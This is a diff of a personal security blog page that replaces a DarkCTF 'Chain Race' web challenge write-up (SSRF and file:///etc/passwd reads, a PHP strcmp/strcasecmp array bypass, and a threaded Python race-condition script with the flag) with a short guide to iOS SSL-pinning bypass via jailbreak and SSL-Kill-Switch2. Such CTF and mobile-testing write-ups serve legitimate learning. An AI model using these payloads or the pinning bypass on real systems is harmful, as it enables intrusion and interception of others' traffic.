@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="DarkCTF Official Writeup - Chain Race, CTF, OSCP, Cyber Security, Blockchain">
+    <meta name="keywords" content="IOS SSL UNPINNING USING SSL-Kill-Switch2, CTF, OSCP, Cyber Security, Blockchain">
     <meta name="description" content="Mukhilan Pari Personal Blog">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>DarkCTF Official Writeup - Chain Race | Mukhilan</title>
+    <title>IOS SSL UNPINNING USING SSL-Kill-Switch2 | Mukhilan</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -324,12 +324,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/writeups/darkctf/darkkkk-nobg.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">DarkCTF Official Writeup - Chain Race</h1>
+                    <h1 class="description center-align post-title">IOS SSL UNPINNING USING SSL-Kill-Switch2</h1>
                 </div>
             </div>
         </div>
@@ -446,20 +446,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/DarkCTF/">
-                                <span class="chip bg-color">DarkCTF</span>
+                            <a href="/tags/Mobile/">
+                                <span class="chip bg-color">Mobile</span>
                             </a>
                         
-                            <a href="/tags/DarkArmy/">
-                                <span class="chip bg-color">DarkArmy</span>
+                            <a href="/tags/Bypass/">
+                                <span class="chip bg-color">Bypass</span>
                             </a>
                         
-                            <a href="/tags/Writeups/">
-                                <span class="chip bg-color">Writeups</span>
-                            </a>
-                        
-                            <a href="/tags/Web/">
-                                <span class="chip bg-color">Web</span>
+                            <a href="/tags/Frida/">
+                                <span class="chip bg-color">Frida</span>
                             </a>
                         
                     </div>
@@ -470,8 +466,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Writeups/" class="post-category">
-                                Writeups
+                            <a href="/categories/Ios/" class="post-category">
+                                Ios
                             </a>
                         
                     </div>
@@ -483,28 +479,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2020-10-01
+                    2019-03-25
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2020-10-01
+                    2020-09-29
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    965
+                    240
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    6 Min
+                    1 Min
                 </div>
                 
 
@@ -519,145 +515,31 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Chain-Race"><a href="#Chain-Race" class="headerlink" title="Chain Race"></a>Chain Race</h1><blockquote>
-<p>Points: <code>472</code><br>Category: WEB<br>Author: Catamob,Z3phyr</p>
-</blockquote>
-<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
-<p>web<br>All files are included. Source code is the key.<br><a target="_blank" rel="noopener" href="http://race.darkarmy.xyz:8999/">http://race.darkarmy.xyz:8999</a></p>
-</blockquote>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>The Challenge link webpage looks like this,</p>
-<p><img src="/medias/writeups/darkctf/chainrace1.png" alt="chainrace 1"></p>
-<p>The working of the website is to provide the content as output with URL as an input. To exploit this, we need to understand the working. As below, localhost:80 gives the HTML content of the webpage, and it uses a post parameter called handler in <code>testhook.php</code>.</p>
-<p><img src="/medias/writeups/darkctf/chainrace2.png" alt="chainrace 2"></p>
-<p>From the above response, localhost is not restricted and also PHP as backend. So, File inclusion is also possible with the payload <code>file:///etc/passwd</code>. From here, <code>testhook.php</code> file also can be extracted by trying with default path <code>file:///var/www/html/testhook.php</code> for full understanding.</p>
-<p><img src="/medias/writeups/darkctf/chainrace3.png" alt="chainrace 3"></p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
-    <span class="token comment" spellcheck="true">// create curl resource </span>
-    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-
-    <span class="token comment" spellcheck="true">// set url </span>
-    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"handler"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-
-    <span class="token comment" spellcheck="true">//return the transfer as a string </span>
-    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-
-    <span class="token comment" spellcheck="true">// $output contains the output string </span>
-    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-
-    <span class="token comment" spellcheck="true">// close curl resource to free up system resources </span>
-    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-    <span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
-<p>PS: Here in the last line we gave the hint as     <code>localhost8080:x:5:60:darksecret-hiddenhere:/usr/games/another-server:/usr/sbin/nologin</code>. This shows localhost8080 is hosted, but this port can’t be accessed outside. So using the working of the website, we can exploit further.</p>
-<h3 id="Without-a-Hint"><a href="#Without-a-Hint" class="headerlink" title="Without a Hint"></a>Without a Hint</h3><p>From the HTTP response <code>Server: Apache/2.4.18 (Ubuntu)</code>, it shows server is hosted in apache. By Enumerating the apache default config file like <code>file:///etc/apache2/sites-available/000-default.conf</code> and <code>file:///etc/apache2/ports.conf</code> will show you another server is hosted in 8080 port internally.</p>
-<pre><code>file:///etc/apache2/sites-available/000-default.conf
-
-# If you just change the port or add more ports here, you will likely also
-# have to change the VirtualHost statement in
-# /etc/apache2/sites-enabled/000-default.conf
-
-Listen 80
-Listen 8080
-
-&lt;IfModule ssl_module&gt;
-    Listen 443
-&lt;/IfModule&gt;
-
-&lt;IfModule mod_gnutls.c&gt;
-    Listen 443
-&lt;/IfModule&gt;
-
-# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
-</code></pre>
-<pre><code>file:///etc/apache2/ports.conf
-
-&lt;VirtualHost *:80&gt;
-    # The ServerName directive sets the request scheme, hostname and port that
-    # the server uses to identify itself. This is used when creating
-    # redirection URLs. In the context of virtual hosts, the ServerName
-    # specifies what hostname must appear in the request's Host: header to
-    # match this virtual host. For the default virtual host (this file) this
-    # value is not decisive as it is used as a last resort host regardless.
-    # However, you must set it for any further virtual host explicitly.
-    #ServerName www.example.com
-
-    ServerAdmin webmaster@localhost
-    DocumentRoot /var/www/html
-
-    # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
-    # error, crit, alert, emerg.
-    # It is also possible to configure the loglevel for particular
-    # modules, e.g.
-    #LogLevel info ssl:warn
-
-    ErrorLog ${APACHE_LOG_DIR}/error.log
-    CustomLog ${APACHE_LOG_DIR}/access.log combined
-
-    # For most configuration files from conf-available/, which are
-    # enabled or disabled at a global level, it is possible to
-    # include a line for only one particular virtual host. For example the
-    # following line enables the CGI configuration for this host only
-    # after it has been globally disabled with "a2disconf".
-    #Include conf-available/serve-cgi-bin.conf
-&lt;/VirtualHost&gt;
-
-&lt;VirtualHost *:8080&gt;
-    ServerAdmin webmaster@localhost
-        DocumentRoot /var/www/html1
-    ErrorLog ${APACHE_LOG_DIR}/error.log
-        CustomLog ${APACHE_LOG_DIR}/access.log combined
-&lt;/VirtualHost&gt;
-
-# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
-</code></pre>
-<p>By accessing localhost:8080 will give the PHP file.</p>
-<h3 id="PHP-string-Bypass"><a href="#PHP-string-Bypass" class="headerlink" title="PHP string Bypass"></a>PHP string Bypass</h3><p>In the given index.php, you can see some string operations. It checks for query params <code>user</code> and <code>secret</code> is set.</p>
-<pre><code>if(!(isset($_GET['user']) &amp;&amp; isset($_GET['secret']))){
-    highlight_file("index.php");
-    die();
-}
-The program dies with nope when we encounter these checks to be true
-if (($_GET['secret'] == "0x1337") || $_GET['user'] == "admin") {
-    die("nope");
-}</code></pre>
-<p>In the first check, the user string is compared with compared with “admin” using strcmp which returns 0 when equal.</p>
-<pre><code>$login_1 = strcmp($_GET['user'], "admin") ? 1 : 0;</code></pre>
-<p>the next check is using strcasecmp which performs a byte-by-byte comparison on two strings.</p>
-<pre><code>if (strcasecmp($_GET['secret'], "0x1337") == 0){
-    $login_2 = 1;
-}</code></pre>
-<p>so the vulnerability is on the kind of compares the each api does. <code>strcmp</code> can be bypassed when the string is greater than the compared string so that <code>login_1</code> becomes one. <code>strcasecmp</code> can be bypassed when the string is an array which essentially returns false which is equal to zero setting <code>login_2</code> true </p>
-<p><img src="/medias/writeups/darkctf/chainrace4.png" alt="chainrace 4"></p>
-<p>To Bypass unlink, Need to exploit using race condition. For that we need <code>turbo intruder</code> or <code>python script</code>.</p>
-<h3 id="Turbo-Intruder"><a href="#Turbo-Intruder" class="headerlink" title="Turbo Intruder"></a>Turbo Intruder</h3><p>Generate a word list with 1 to 10000 for continuous hit and use the default script in intruder by providing the generated word list as input. And in <code>handleresponse</code> <code>if dark in req.response</code> will give you the filtered output.</p>
-<p><img src="/medias/writeups/darkctf/chainrace5.png" alt="chainrace 5"></p>
-<p>Execute the turbo intruder will give you the below flag.</p>
-<p><img src="/medias/writeups/darkctf/chainrace6.png" alt="chainrace 6"></p>
-<h3 id="Python-Script"><a href="#Python-Script" class="headerlink" title="Python Script"></a>Python Script</h3><p>This below python script will also give you the answer.</p>
-<pre><code>import threading
-import requests
-
-for i in range(0x200):
-
-    def login():
-        s= {'handler':'http://127.0.0.1:8080/index.php?user=admin1212&amp;secret[]'}
-        url="http://race.darkarmy.xyz:8999/testhook.php"
-        r=requests.post(url,data=s)
-        if "darkCTF{" in r.content:
-            print r.content
-            exit(0)
-
-    threading.Thread(target=login).start()</code></pre>
-<h3 id="Sanity-Checks"><a href="#Sanity-Checks" class="headerlink" title="Sanity Checks"></a>Sanity Checks</h3><ul>
-<li>Usage of <code>===</code> instead of <code>==</code> </li>
-<li><code>strncasecmp</code> instead of <code>strcasecmp</code> which essentially compares n bytes </li>
-<li>usage of <code>file_exists</code> api before file operations</li>
-</ul>
-<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><blockquote>
-<p>darkCTF{9h9_15_50_a3fu1}</p>
-</blockquote>
-<h2 id="Credits"><a href="#Credits" class="headerlink" title="Credits"></a>Credits</h2><p>Z3phyr - <code>https://github.com/GiridharPrasath/ctf/tree/master/darkctf/web</code></p>
+                <h3 id="Why-SSL-pinning"><a href="#Why-SSL-pinning" class="headerlink" title="Why SSL pinning?"></a>Why SSL pinning?</h3><p>SSL Pinning is where you ignore that whole thing, and say trust this certificate only or perhaps trust only certificates which are signed by this CA. </p>
+<h3 id="Ways-to-bypass-Ios-ssl-verification-certificate-pinning"><a href="#Ways-to-bypass-Ios-ssl-verification-certificate-pinning" class="headerlink" title="Ways to bypass Ios ssl verification certificate pinning"></a>Ways to bypass Ios ssl verification certificate pinning</h3><ol>
+<li>Installing your own CA</li>
+<li>Installing Software to iOS Device</li>
+<li>Using Objection and Frida</li>
+<li>Using disassemblers to modify IPA file</li>
+</ol>
+<h2 id="Method-used"><a href="#Method-used" class="headerlink" title="Method used"></a>Method used</h2><p>This method requires jailbroken device and it should be less than ios version 12 for ssl-kill-switch2 to work. To jailbreak the device, Electra is used. </p>
+<h3 id="Jailbreak"><a href="#Jailbreak" class="headerlink" title="Jailbreak"></a>Jailbreak</h3><p>Install Hydra, using Cydia Impactor and click <code>jailbreak</code> button. After jailbreak is done, Cydia application will be installed. Make sure SSH connection is proper.</p>
+<p><img src="/medias/projects/ios-ssl/cydia.PNG" alt="cydia"></p>
+<h3 id="Dependencies"><a href="#Dependencies" class="headerlink" title="Dependencies"></a>Dependencies</h3><p>Make sure to install following packages.</p>
+<ol>
+<li>Debian Packager</li>
+<li>Cydia Substrate</li>
+<li>PreferenceLoader</li>
+</ol>
+<p><img src="/medias/projects/ios-ssl/dep.PNG" alt="dep install"></p>
+<h3 id="SSL-Kill-Switch2"><a href="#SSL-Kill-Switch2" class="headerlink" title="SSL-Kill-Switch2"></a>SSL-Kill-Switch2</h3><p>Transfer the application to iphone using any method and use below commands to make that work.</p>
+<pre><code>$dpkg -i &lt;package&gt;.deb
+$killall -HUP SpringBoard</code></pre>
+<p>dpkg is used to install the package and another command is to restart that.</p>
+<p>Finally, enable ssl-kill-switch2 in settings.</p>
+<p><img src="/medias/projects/ios-ssl/app-on.PNG" alt="ssl on"></p>
+<p>Note: Unpinning happens in the runtime. So, No need to mention specific application. </p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><pre><code>https://github.com/nabla-c0d3/ssl-kill-switch2</code></pre>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -701,7 +583,7 @@ for i in range(0x200):
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://mukhilan.com/darkctf-official-chain-race/">http://mukhilan.com/darkctf-official-chain-race/</a>
+                    <a href="http://mukhilan.com/Ios/iso-ssl-bypass/">http://mukhilan.com/Ios/iso-ssl-bypass/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -739,20 +621,16 @@ for i in range(0x200):
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/DarkCTF/">
-                                    <span class="chip bg-color">DarkCTF</span>
+                                <a href="/tags/Mobile/">
+                                    <span class="chip bg-color">Mobile</span>
                                 </a>
                             
-                                <a href="/tags/DarkArmy/">
-                                    <span class="chip bg-color">DarkArmy</span>
+                                <a href="/tags/Bypass/">
+                                    <span class="chip bg-color">Bypass</span>
                                 </a>
                             
-                                <a href="/tags/Writeups/">
-                                    <span class="chip bg-color">Writeups</span>
-                                </a>
-                            
-                                <a href="/tags/Web/">
-                                    <span class="chip bg-color">Web</span>
+                                <a href="/tags/Frida/">
+                                    <span class="chip bg-color">Frida</span>
                                 </a>
                             
                         </div>
@@ -797,7 +675,7 @@ for i in range(0x200):
         repo: 'mukhilanpari.github.io',
         owner: 'mukhilanpari',
         admin: "mukhilanpari",
-        id: '2020-10-01T20-24-08',
+        id: '2019-03-25T00-00-00',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -821,29 +699,28 @@ for i in range(0x200):
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;Current
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/darkctf-official-chain-race/">
+                <a href="/Writeups/darkctf-official-secret-contract/">
                     <div class="card-image">
                         
-                        <img src="/medias/writeups/darkctf/darkkkk-nobg.png" class="responsive-img" alt="DarkCTF Official Writeup - Chain Race">
+                        <img src="/medias/writeups/darkctf/darkkkk-nobg.png" class="responsive-img" alt="DarkCTF Official Writeup - Secret of the Contract">
                         
-                        <span class="card-title">DarkCTF Official Writeup - Chain Race</span>
+                        <span class="card-title">DarkCTF Official Writeup - Secret of the Contract</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            DarkCTF conducted by DarkArmy Official Writeup of Chain Race challenge
+                            DarkCTF conducted by DarkArmy Official Writeup of Secret of the Contract challenge
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-10-01
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-10-01
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -856,7 +733,6 @@ for i in range(0x200):
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -872,8 +748,8 @@ for i in range(0x200):
                         <span class="chip bg-color">Writeups</span>
                     </a>
                     
-                    <a href="/tags/Web/">
-                        <span class="chip bg-color">Web</span>
+                    <a href="/tags/blockchain/">
+                        <span class="chip bg-color">blockchain</span>
                     </a>
                     
                 </div>
@@ -887,30 +763,31 @@ for i in range(0x200):
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/darkctf-official-dark-social-web/">
+                <a href="/Android/ssl-pin-bypass/">
                     <div class="card-image">
                         
-                        <img src="/medias/writeups/darkctf/darkkkk-nobg.png" class="responsive-img" alt="DarkCTF Official Writeup - Dark Social Web">
                         
-                        <span class="card-title">DarkCTF Official Writeup - Dark Social Web</span>
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="SSL UNPINNING USING XPOSED MODULE">
+                        
+                        <span class="card-title">SSL UNPINNING USING XPOSED MODULE</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            DarkCTF conducted by DarkArmy Official Writeup of Dark Social Web challenge
+                            Xposed Framework to Bypass Android SSL Verification and Certificate Pinning
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-10-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-02-05
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Writeups/" class="post-category">
-                                    Writeups
+                            <a href="/categories/Android/" class="post-category">
+                                    Android
                                 </a>
                             
                             
@@ -920,20 +797,16 @@ for i in range(0x200):
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/DarkCTF/">
-                        <span class="chip bg-color">DarkCTF</span>
+                    <a href="/tags/Mobile/">
+                        <span class="chip bg-color">Mobile</span>
                     </a>
                     
-                    <a href="/tags/DarkArmy/">
-                        <span class="chip bg-color">DarkArmy</span>
+                    <a href="/tags/Bypass/">
+                        <span class="chip bg-color">Bypass</span>
                     </a>
                     
-                    <a href="/tags/Writeups/">
-                        <span class="chip bg-color">Writeups</span>
-                    </a>
-                    
-                    <a href="/tags/Osint/">
-                        <span class="chip bg-color">Osint</span>
+                    <a href="/tags/Xposed/">
+                        <span class="chip bg-color">Xposed</span>
                     </a>
                     
                 </div>
